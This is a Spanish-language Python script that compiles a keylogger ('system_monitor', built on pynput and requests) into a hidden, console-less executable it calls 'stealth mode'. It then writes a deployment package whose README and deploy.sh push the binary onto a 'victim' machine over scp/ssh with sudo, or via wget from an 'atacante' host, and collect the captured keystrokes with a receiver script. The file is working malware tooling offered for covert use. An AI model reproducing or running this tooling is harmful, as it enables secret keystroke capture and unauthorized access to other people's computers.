#!/usr/bin/env python3
"""
build_keylogger_ultimate.py - Compilador Avanzado de Keylogger
Método definitivo con múltiples fallbacks para resolver problemas de dependencias
Especialmente diseñado para resolver problemas con pynput en PyInstaller
"""

import os
import sys
import subprocess
import shutil
import platform
import datetime

def print_banner():
    """Mostrar banner del compilador"""
    print("🛠️  COMPILADOR ULTIMATE DE KEYLOGGER")
    print("=" * 50)
    print("🎯 Objetivo: Crear ejecutable standalone")
    print("🔧 Método: Múltiples técnicas avanzadas")
    print("💡 Soluciona: Problemas de dependencias complejas")
    print("=" * 50)

def check_dependencies():
    """Verificar que todas las dependencias estén disponibles"""
    print("🔍 Verificando dependencias...")
    
    # Verificar archivos necesarios
    required_files = ["system_monitor.py", "reconstructor.py"]
    for file in required_files:
        if not os.path.exists(file):
            print(f"❌ Archivo requerido no encontrado: {file}")
            return False
        print(f"✅ {file}")
    
    # Verificar Python modules
    required_modules = ["pynput", "requests"]
    for module in required_modules:
        try:
            __import__(module)
            print(f"✅ {module}")
        except ImportError:
            print(f"❌ Módulo {module} no encontrado")
            print(f"   Instala con: pip install {module}")
            return False
    
    return True

def install_pyinstaller():
    """Instalar PyInstaller con múltiples métodos"""
    print("🔧 Verificando/Instalando PyInstaller...")
    
    # Verificar si ya está instalado
    try:
        import PyInstaller
        print("✅ PyInstaller ya disponible")
        return True
    except ImportError:
        pass
    
    # Método 1: pip install con --break-system-packages
    methods = [
        [sys.executable, "-m", "pip", "install", "pyinstaller", "--break-system-packages"],
        [sys.executable, "-m", "pip", "install", "pyinstaller"],
        ["sudo", "apt", "install", "-y", "python3-pyinstaller"],
        ["apt", "install", "-y", "python3-pyinstaller"]
    ]
    
    for i, cmd in enumerate(methods, 1):
        try:
            print(f"⚡ Método {i}: {' '.join(cmd[:3])}...")
            subprocess.run(cmd, check=True, capture_output=True)
            print("✅ PyInstaller instalado")
            return True
        except (subprocess.CalledProcessError, FileNotFoundError):
            continue
    
    print("❌ No se pudo instalar PyInstaller automáticamente")
    print("💡 Intenta manualmente:")
    print("   sudo apt install python3-pyinstaller")
    print("   o")
    print("   pip install pyinstaller --break-system-packages")
    return False

def create_advanced_spec():
    """Crear archivo .spec ultra-avanzado para resolver todos los problemas"""
    spec_content = '''# -*- mode: python ; coding: utf-8 -*-
# Ultra Advanced .spec file - Keylogger System Monitor
# Soluciona TODOS los problemas de dependencias conocidos

import os
import sys
from PyInstaller.building.build_main import Analysis, PYZ, EXE
from PyInstaller.utils.hooks import collect_all, collect_data_files, collect_dynamic_libs

# ==========================================
# RECOLECCIÓN EXHAUSTIVA DE DEPENDENCIAS
# ==========================================

print("🔍 Recolectando dependencias de pynput...")
pynput_datas, pynput_binaries, pynput_hiddenimports = collect_all('pynput')

print("🔍 Recolectando dependencias de requests...")
requests_datas, requests_binaries, requests_hiddenimports = collect_all('requests')

print("🔍 Recolectando dependencias de urllib3...")
urllib3_datas, urllib3_binaries, urllib3_hiddenimports = collect_all('urllib3')

print("🔍 Recolectando dependencias de certifi...")
certifi_datas, certifi_binaries, certifi_hiddenimports = collect_all('certifi')

# Combinar todas las dependencias automáticas
all_datas = (pynput_datas + requests_datas + urllib3_datas + certifi_datas + 
             [('reconstructor.py', '.')])

all_binaries = pynput_binaries + requests_binaries + urllib3_binaries + certifi_binaries

# Lista EXHAUSTIVA de imports ocultos
all_hiddenimports = list(set(
    pynput_hiddenimports + requests_hiddenimports + 
    urllib3_hiddenimports + certifi_hiddenimports + [
        # pynput core
        'pynput',
        'pynput.keyboard',
        'pynput.mouse',
        'pynput._util',
        # pynput backends
        'pynput.keyboard._base',
        'pynput.keyboard._xorg',
        'pynput.keyboard._win32', 
        'pynput.keyboard._darwin',
        'pynput.mouse._base',
        'pynput.mouse._xorg',
        'pynput.mouse._win32',
        'pynput.mouse._darwin',
        # pynput utils por plataforma
        'pynput._util.linux',
        'pynput._util.darwin', 
        'pynput._util.win32',
        'pynput._util.xorg',
        # X11 dependencies (Linux)
        'Xlib',
        'Xlib.display',
        'Xlib.X',
        'Xlib.protocol',
        'Xlib.protocol.request',
        'Xlib.protocol.display',
        'Xlib.ext',
        'Xlib.ext.record',
        'Xlib.ext.randr',
        # evdev (Linux input)
        'evdev',
        'evdev.device',
        'evdev.events',
        'evdev.ecodes',
        # requests y urllib3 completo
        'requests',
        'requests.models',
        'requests.api',
        'requests.sessions',
        'requests.adapters',
        'requests.auth',
        'requests.cookies',
        'requests.packages',
        'requests.packages.urllib3',
        'requests.packages.urllib3.contrib',
        'requests.packages.urllib3.util',
        'urllib3',
        'urllib3.connection',
        'urllib3.connectionpool',
        'urllib3.util',
        'urllib3.util.connection',
        'urllib3.util.retry',
        'urllib3.util.ssl_',
        'urllib3.contrib',
        'urllib3.contrib.socks',
        # certificados SSL
        'certifi',
        'charset_normalizer',
        'idna',
        # módulos estándar críticos
        'base64',
        'hashlib',
        'threading',
        'time',
        'os',
        'sys',
        'json',
        'datetime',
        'socket',
        'ssl',
        'select',
        'signal',
        'struct',
        'ctypes',
        'ctypes.util',
        # reconstructor custom
        'reconstructor'
    ]
))

print(f"📊 Datos recolectados: {len(all_datas)} archivos")
print(f"📊 Binarios recolectados: {len(all_binaries)} archivos")  
print(f"📊 Imports ocultos: {len(all_hiddenimports)} módulos")

# ==========================================
# CONFIGURACIÓN DE ANÁLISIS
# ==========================================

a = Analysis(
    ['system_monitor.py'],
    pathex=['.'],
    binaries=all_binaries,
    datas=all_datas,
    hiddenimports=all_hiddenimports,
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[
        # Excluir módulos innecesarios para reducir tamaño
        'tkinter',
        'matplotlib',
        'numpy',
        'pandas',
        'scipy',
        'PIL',
        'win32api',
        'win32con',
        'win32gui'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=None,
    noarchive=False,
)

# ==========================================
# CONFIGURACIÓN DE EJECUTABLE
# ==========================================

pyz = PYZ(a.pure, a.zipped_data, cipher=None)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='system_monitor',
    debug=False,                    # Sin debug para producción
    bootloader_ignore_signals=False,
    strip=False,                    # No strip para compatibilidad
    upx=True,                      # Comprimir con UPX si está disponible
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,                  # SIN consola (stealth mode)
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None
)

print("✅ Configuración .spec completada")
'''
    
    with open("system_monitor_ultimate.spec", "w") as f:
        f.write(spec_content)
    
    print("✅ Archivo .spec ultra-avanzado creado: system_monitor_ultimate.spec")
    return True

def build_method_1_ultimate_spec():
    """Método 1: Compilación con .spec ultra-avanzado"""
    print("\n🎯 MÉTODO 1: Archivo .spec ultra-avanzado")
    print("-" * 40)
    
    try:
        # Crear archivo .spec ultra-avanzado
        create_advanced_spec()
        
        # Compilar usando el archivo .spec
        cmd = [sys.executable, "-m", "PyInstaller", "system_monitor_ultimate.spec", "--clean"]
        
        print("💻 Ejecutando PyInstaller con .spec ultra-avanzado...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("✅ ¡ÉXITO! Método .spec ultra-avanzado")
            print(f"📂 Ejecutable: {executable_path}")
            print(f"📏 Tamaño: {size_mb:.1f} MB")
            print("🎯 Método: .spec ultra-avanzado (máxima compatibilidad)")
            print("🔒 Modo: Sin consola (stealth)")
            
            return True, executable_path
            
    except subprocess.CalledProcessError as e:
        print("⚠️  Método .spec ultra-avanzado falló")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
        
    return False, None

def build_method_2_collect_all():
    """Método 2: Comando directo con --collect-all agresivo"""
    print("\n🎯 MÉTODO 2: --collect-all agresivo")
    print("-" * 40)
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name=system_monitor",
        "--add-data=reconstructor.py:.",
        # Recolectar TODO de las librerías problemáticas
        "--collect-all=pynput",
        "--collect-all=requests", 
        "--collect-all=urllib3",
        "--collect-all=certifi",
        "--collect-all=charset_normalizer",
        "--collect-all=idna",
        "--collect-all=Xlib",
        "--collect-all=evdev",
        # Imports críticos específicos
        "--hidden-import=pynput.keyboard._xorg",
        "--hidden-import=pynput.mouse._xorg",  
        "--hidden-import=pynput._util.linux",
        "--hidden-import=pynput._util.xorg",
        "--hidden-import=Xlib.display",
        "--hidden-import=evdev.device",
        "--hidden-import=urllib3.util.retry",
        "--hidden-import=requests.packages.urllib3",
        "--hidden-import=reconstructor",
        # Configuración de compilación
        "--noconsole",  # Sin consola para stealth
        "--clean",
        "system_monitor.py"
    ]
    
    try:
        print("💻 Ejecutando PyInstaller con --collect-all agresivo...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("✅ ¡ÉXITO! Método --collect-all agresivo")
            print(f"📂 Ejecutable: {executable_path}")
            print(f"📏 Tamaño: {size_mb:.1f} MB")
            print("🎯 Método: --collect-all agresivo")
            print("🔒 Modo: Sin consola (stealth)")
            
            return True, executable_path
        
    except subprocess.CalledProcessError as e:
        print("⚠️  Método --collect-all agresivo falló")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
    
    return False, None

def build_method_3_console_debug():
    """Método 3: Compilación con consola para debug"""
    print("\n🎯 MÉTODO 3: Con consola para debug")
    print("-" * 40)
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name=system_monitor_debug",
        "--add-data=reconstructor.py:.",
        "--collect-all=pynput",
        "--collect-all=requests", 
        "--hidden-import=pynput.keyboard._xorg",
        "--hidden-import=pynput.mouse._xorg",  
        "--hidden-import=pynput._util.linux",
        "--hidden-import=reconstructor",
        "--console",  # CON consola para ver errores
        "--clean",
        "system_monitor.py"
    ]
    
    try:
        print("💻 Ejecutando PyInstaller con consola debug...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor_debug"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("✅ ¡ÉXITO! Método con consola debug")
            print(f"📂 Ejecutable: {executable_path}")
            print(f"📏 Tamaño: {size_mb:.1f} MB")
            print("🎯 Método: Con consola para debug")
            print("⚠️  Nota: Incluye consola para debugging")
            
            return True, executable_path
        
    except subprocess.CalledProcessError as e:
        print("⚠️  Método con consola debug falló")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
    
    return False, None

def build_method_4_minimal():
    """Método 4: Ejecutable mínimo (requiere deps en destino)"""
    print("\n🎯 MÉTODO 4: Ejecutable mínimo")
    print("-" * 40)
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name=system_monitor_minimal",
        "--add-data=reconstructor.py:.",
        "--noconsole",
        "--clean",
        "system_monitor.py"
    ]
    
    try:
        print("💻 Ejecutando PyInstaller minimal...")
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        executable_path = "dist/system_monitor_minimal"
        if os.path.exists(executable_path):
            os.chmod(executable_path, 0o755)
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("✅ ¡ÉXITO! Método mínimo")
            print(f"📂 Ejecutable: {executable_path}")
            print(f"📏 Tamaño: {size_mb:.1f} MB")
            print("🎯 Método: Mínimo (requiere deps en destino)")
            print("⚠️  NOTA: Requiere pynput y requests en sistema destino")
            
            return True, executable_path
        
    except subprocess.CalledProcessError as e:
        print("⚠️  Método mínimo falló")
        if e.stderr:
            print(f"   Error: {e.stderr[:200]}...")
    
    return False, None

def test_executable(executable_path):
    """Probar que el ejecutable funciona básicamente"""
    print(f"\n🧪 Probando ejecutable: {executable_path}")
    print("-" * 40)
    
    if not os.path.exists(executable_path):
        print("❌ Ejecutable no encontrado")
        return False
    
    # Test básico: verificar que se puede ejecutar
    try:
        # Ejecutar por 2 segundos para ver si inicia sin errores
        process = subprocess.Popen([executable_path], 
                                 stdout=subprocess.PIPE, 
                                 stderr=subprocess.PIPE)
        
        # Esperar un poco y luego terminar
        import time
        time.sleep(2)
        process.terminate()
        
        stdout, stderr = process.communicate(timeout=5)
        
        print("✅ Ejecutable se inicia correctamente")
        if stderr:
            print(f"⚠️  Stderr: {stderr.decode()[:200]}...")
        
        return True
        
    except Exception as e:
        print(f"❌ Error al probar ejecutable: {e}")
        return False

def create_deployment_package(successful_executables):
    """Crear paquete de despliegue con todos los ejecutables exitosos"""
    print("\n📦 Creando paquete de despliegue...")
    print("-" * 40)
    
    if not successful_executables:
        print("❌ No hay ejecutables exitosos para empaquetar")
        return
    
    # Crear directorio de despliegue
    deploy_dir = "keylogger_deployment"
    if os.path.exists(deploy_dir):
        shutil.rmtree(deploy_dir)
    os.makedirs(deploy_dir)
    
    # Copiar ejecutables exitosos
    for name, path in successful_executables:
        dest_path = os.path.join(deploy_dir, os.path.basename(path))
        shutil.copy2(path, dest_path)
        print(f"✅ Copiado: {name}")
    
    # Crear archivo README de despliegue
    readme_content = f'''# PAQUETE DE DESPLIEGUE KEYLOGGER
Generated on: {datetime.datetime.now()}

## EJECUTABLES INCLUIDOS:
'''
    
    for name, path in successful_executables:
        size = os.path.getsize(path) / (1024 * 1024)
        readme_content += f"\n- {os.path.basename(path)} ({size:.1f} MB) - {name}"
    
    readme_content += '''

## INSTRUCCIONES DE USO:

### 1. DESPLIEGUE EN VÍCTIMA:
```bash
# Transferir ejecutable
scp system_monitor* usuario@victima:/tmp/

# Ejecutar en víctima
ssh usuario@victima 'chmod +x /tmp/system_monitor* && sudo /tmp/system_monitor*'
```

### 2. DESPLIEGUE VÍA WEB:
```bash
# Servir archivos vía HTTP
python3 -m http.server 8000

# En víctima (navegador):
http://atacante:8000 -> Descargar ejecutable

# En víctima (terminal):
wget http://atacante:8000/keylogger_deployment/system_monitor
chmod +x system_monitor && sudo ./system_monitor
```

### 3. RECEPCIÓN DE DATOS:
```bash
# En máquina atacante
python3 data_receiver.py
```

## NOTAS DE COMPATIBILIDAD:
- system_monitor: Standalone completo (recomendado)
- system_monitor_debug: Con consola para debugging
- system_monitor_minimal: Requiere deps en destino
'''
    
    with open(os.path.join(deploy_dir, "README.md"), "w") as f:
        f.write(readme_content)
    
    # Crear script de despliegue automático
    deploy_script = f'''#!/bin/bash
# Script de despliegue automático

echo "🚀 DESPLIEGUE AUTOMÁTICO KEYLOGGER"
echo "================================="

# Verificar conexión con víctima
read -p "IP de víctima: " VICTIM_IP
read -p "Usuario víctima: " VICTIM_USER

echo "📡 Transfiriendo ejecutable..."
scp system_monitor $VICTIM_USER@$VICTIM_IP:/tmp/

echo "🔧 Configurando permisos y ejecutando..."
ssh $VICTIM_USER@$VICTIM_IP 'chmod +x /tmp/system_monitor && sudo /tmp/system_monitor &'

echo "✅ Keylogger desplegado"
echo "💡 Inicia receptor con: python3 data_receiver.py"
'''
    
    with open(os.path.join(deploy_dir, "deploy.sh"), "w") as f:
        f.write(deploy_script)
    os.chmod(os.path.join(deploy_dir, "deploy.sh"), 0o755)
    
    print(f"✅ Paquete creado en: {deploy_dir}/")
    print(f"📁 Archivos incluidos: {len(successful_executables)} ejecutables + scripts")

def main():
    """Función principal del compilador ultimate"""
    
    print_banner()
    
    # Verificar dependencias
    if not check_dependencies():
        print("\n❌ Dependencias faltantes. Ejecuta primero:")
        print("   pip install pynput requests")
        return
    
    # Instalar PyInstaller
    if not install_pyinstaller():
        return
    
    # Limpiar compilaciones anteriores
    print("\n🧹 Limpiando compilaciones anteriores...")
    for dir_name in ["dist", "build"]:
        if os.path.exists(dir_name):
            shutil.rmtree(dir_name)
    
    for spec_file in ["system_monitor.spec", "system_monitor_ultimate.spec"]:
        if os.path.exists(spec_file):
            os.remove(spec_file)
    
    # Intentar múltiples métodos de compilación
    print("\n🚀 INICIANDO COMPILACIÓN CON MÚLTIPLES MÉTODOS...")
    print("=" * 60)
    
    successful_builds = []
    
    # Método 1: .spec ultra-avanzado
    success, path = build_method_1_ultimate_spec()
    if success:
        successful_builds.append(("Ultra-Advanced .spec", path))
        if test_executable(path):
            print("🎯 ¡MÉTODO ÓPTIMO ENCONTRADO! Usando .spec ultra-avanzado")
    
    # Método 2: --collect-all agresivo
    success, path = build_method_2_collect_all()
    if success:
        successful_builds.append(("Collect-All Agresivo", path))
        if test_executable(path):
            print("🎯 Método alternativo funcional: --collect-all agresivo")
    
    # Método 3: Con consola para debug
    success, path = build_method_3_console_debug()
    if success:
        successful_builds.append(("Con Consola Debug", path))
        if test_executable(path):
            print("🎯 Método debug funcional: con consola")
    
    # Método 4: Mínimo
    success, path = build_method_4_minimal()
    if success:
        successful_builds.append(("Mínimo", path))
        if test_executable(path):
            print("🎯 Método mínimo funcional: requiere deps")
    
    # Mostrar resultados
    print("\n" + "=" * 60)
    print("📊 RESUMEN DE COMPILACIÓN")
    print("=" * 60)
    
    if successful_builds:
        print(f"✅ Métodos exitosos: {len(successful_builds)}")
        
        for name, path in successful_builds:
            size = os.path.getsize(path) / (1024 * 1024)
            print(f"   📂 {name}: {path} ({size:.1f} MB)")
        
        # Crear paquete de despliegue
        create_deployment_package(successful_builds)
        
        print("\n🎯 RECOMENDACIONES:")
        if any("Ultra-Advanced" in name for name, _ in successful_builds):
            print("   🏆 USAR: system_monitor (método .spec ultra-avanzado)")
            print("       → Máxima compatibilidad y modo stealth")
        elif any("Agresivo" in name for name, _ in successful_builds):
            print("   🥈 USAR: system_monitor (método --collect-all)")
            print("       → Buena compatibilidad y modo stealth")
        elif any("Debug" in name for name, _ in successful_builds):
            print("   🥉 USAR: system_monitor_debug (con consola)")
            print("       → Para debugging, muestra errores")
        
        print("\n📋 PRÓXIMOS PASOS:")
        print("1. Probar ejecutable en máquina víctima")
        print("2. Iniciar receptor: python3 data_receiver.py")
        print("3. Usar interfaz web: python3 -m http.server 8000")
        
    else:
        print("❌ NINGÚN MÉTODO EXITOSO")
        print("\n💡 ALTERNATIVAS:")
        print("1. Usar instalación automática: auto_setup.sh")
        print("2. Instalación manual en víctima:")
        print("   pip install pynput requests")
        print("   python3 system_monitor.py")
        print("\n🔍 DIAGNÓSTICO:")
        print("- Verificar que pynput funciona: python3 -c 'import pynput; print(\"OK\")'")
        print("- Instalar deps sistema: sudo apt install python3-tk python3-dev")
        print("- Usar Parrot/Kali con deps preinstaladas")

if __name__ == "__main__":
    main()
